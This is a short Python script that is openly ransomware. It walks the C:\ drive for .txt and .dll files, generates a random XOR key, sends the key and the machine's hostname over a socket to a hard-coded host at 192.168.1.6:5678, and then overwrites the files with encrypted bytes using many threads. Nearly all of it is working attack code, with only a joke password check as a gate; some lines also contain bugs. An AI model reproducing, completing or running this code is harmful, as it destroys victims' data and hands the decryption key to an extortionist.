import os
import random
import socket
import datetime
from threading import Thread
from queue import Queue



#safeguard password so you dont hack yourself out xd
initial=str(input("enter initiator password:"))
if initial != "666" :
    quit()

#files you would like to encrypt 
encext=('.txt','.dll')

#extracting files 
file_paths=[]
for root, dir,files in os.walk('C:\\'):
    for file in files:
        file_path,file_Ext=os.path.splitext(root+'\\'+file)
        if file_Ext in encext:
                file_paths.append(root+'\\'+file)




key=''
encryption_level=128//8
char_pool=''
for i in range(0x00,0xFF):
    char_pool+=(chr(i))

for i in range(encryption_level):
    key += random.choice(char_pool)


hostname=os.getenv('COMPUTERNAME')
print(hostname)



ipa='192.168.1.6'
port=5678
time=datetime.now()


with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
    s.connect((ipa,port))
    s.send(f'[{time}] - {hostname}:{key}'.encode('utf-8'))



#encrypt files

def encrypt(key):
     file = q.get()
     index=0
     max_index=encryption_level-1
     try:
          with open(file,'rb') as f:
               data=f.read()
          with open (file,'w')as f:
               for byte in data:
                    xor_byte=byte ^ ord(key[index])
                    f.write(xor_byte.to_bytes(1,'little'))
                    if index >= max_index:
                         index=0
                    else:
                         index += 1
     except:
          print(f'failed to encrypt{file}')
     q.task_done()


 
     

q=Queue()
for file in file_paths:
     q.put(file)

for i in range(30):
     thread=Thread(target=encrypt,args=(key,) ,daemon=True )
     thread.start()


q.join()
print('encryption is done')
